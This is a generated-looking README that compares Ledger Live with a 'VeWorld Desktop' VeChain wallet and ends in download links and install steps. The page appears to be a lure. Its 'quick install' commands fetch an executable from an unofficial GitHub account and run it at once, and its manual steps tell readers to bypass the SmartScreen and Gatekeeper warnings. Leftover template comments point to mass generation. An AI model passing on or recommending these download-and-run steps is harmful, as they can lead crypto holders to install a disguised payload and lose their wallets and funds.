![VeWorld Desktop](../assets/banner-article.png)

# VeChain Ledger Live vs VeWorld Desktop: Which Part Does What

One manages the device, the other does chain work

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> Every signature is approved on the device screen, so read it there rather than in the app window.

Ledger Live is the device vendor's companion software; VeWorld Desktop is a VeChain wallet that uses a Ledger to sign. The device holds the keys in both cases, and neither application can move funds without a confirmation on that device. What differs is which chain each one is built to manage.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You installed Ledger Live when you bought the device and are unsure whether a second application is needed, or you added an account in one and cannot find it in the other.

| Task | Ledger Live | VeWorld Desktop |
|---|---|---|
| Device firmware and app installation | Yes, its main job | No |
| Holding VeChain keys | Only with VeChain support installed | Paired device, VeChain app |
| VeChain token and NFT view | Limited to what its chain support shows | Built around VeChain accounts |
| StarGate staking | Not its function | Through the wallet's staking flow |
| Signing a VeChain transaction | Possible where supported | Yes, with device confirmation |

## Why it happens

A hardware vendor ships software that manages its devices across many chains. That software has to install apps, update firmware, and present a portfolio view that makes sense for dozens of networks, so its chain-specific depth varies. A wallet built for one chain can afford to go deeper on that chain's account model, token standards and staking.

This is why both can exist on one machine without contradiction. Ledger Live is where the device itself is maintained; the wallet is where VeChain work happens. Removing either does not remove the keys, because the keys were never in either application.

Confusion usually starts at account discovery. An account added in one application is a view of an address derived from the device; the other application does not automatically know that view exists, because it keeps its own list. Nothing is missing from the chain - the address is the same one, and adding it in the second application shows the same balance.

The second confusion is about authority. Neither application can sign alone. A transaction built in the wallet still needs the device, and a transaction built in the vendor's software needs it too. That is a property of the hardware rather than of either interface, and it is what makes the choice between them a question of convenience rather than of safety.

## Fix

1. Use the vendor's software for device-level tasks: firmware updates and installing the VeChain app.
2. Use VeWorld Desktop for VeChain accounts, tokens, staking and transactions.
3. Close the vendor software before starting a Ledger session in the wallet, since only one program can hold the device at a time.
4. In the wallet, add the Ledger account and confirm the derived address on the device screen.
5. If an address was previously used in the other application, add the same index in the wallet so both views agree.
6. Sign a small test transaction and confirm the prompt on the device.

## If that did not work

If the wallet cannot see the device while the vendor software is running, that is expected: close the other program and retry.

If an account appears in one application and not the other, add it manually in the second one by choosing the same index. The chain has no concept of an application's account list.

If a signature is refused by the device, confirm the VeChain app is open and that the address on the device matches the account selected in the wallet.

## Prevention

- Keep device maintenance in the vendor's software and chain work in the wallet.
- Run one application at a time when a device is connected.
- Record which index each account uses, so both views can be reproduced.
- Never enter the recovery phrase into either application; the device and its paper backup are the only places it belongs.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Do I need Ledger Live at all?

For firmware updates and installing coin apps, yes, or at least something that performs those device-level tasks. For VeChain activity, the wallet is the working interface.

### Can Ledger Live manage <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vet-in-veworld-desktop.md">VET for a VeWorld Desktop account</a> directly?

Its chain support determines what it can show, and depth varies by network. Treat it as the device manager and use a VeChain wallet for VeChain work.

### Does using two applications risk my keys?

No. The keys stay on the device, and each application holds only a view of the addresses it knows about.

### Why does the wallet show an empty account my device already uses?

Because that account was never added in the wallet. Choose the matching index and the balance appears.

### Can the wallet sign without the device?

No. A paired Ledger requires a physical confirmation for every signature, which is the reason to use one.

### Which application should I open first?

The wallet, when you want to transact, with the device unlocked and the VeChain app open. The vendor software only when the device itself needs attention.

### Can I stake through the vendor's software?

Staking is a VeChain programme, and the wallet is the interface built for it. The vendor software manages devices across many chains and is not the place to open a StarGate position.

### Does the wallet need the vendor software open?

No, and it is better closed. Only one program can hold the device at a time, so leaving it open is the usual reason a wallet cannot see a connected Ledger.

### Which application knows my token balances?

The chain knows them, and each application reads what it can display. A VeChain wallet shows VET, <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vtho-in-veworld-desktop.md">VTHO and tokens</a> at the address; vendor software shows what its chain support covers.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [Pairing the device with the desktop wallet](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md)
- [When the device is not detected](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-sync-not-detected-veworld-desktop.md)
- [Whether an older Nano S is usable](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-nano-s-in-veworld-desktop.md)
- [What hardware still cannot protect](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-wallet-losses-veworld-desktop.md)
- [How self-custody works here](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md)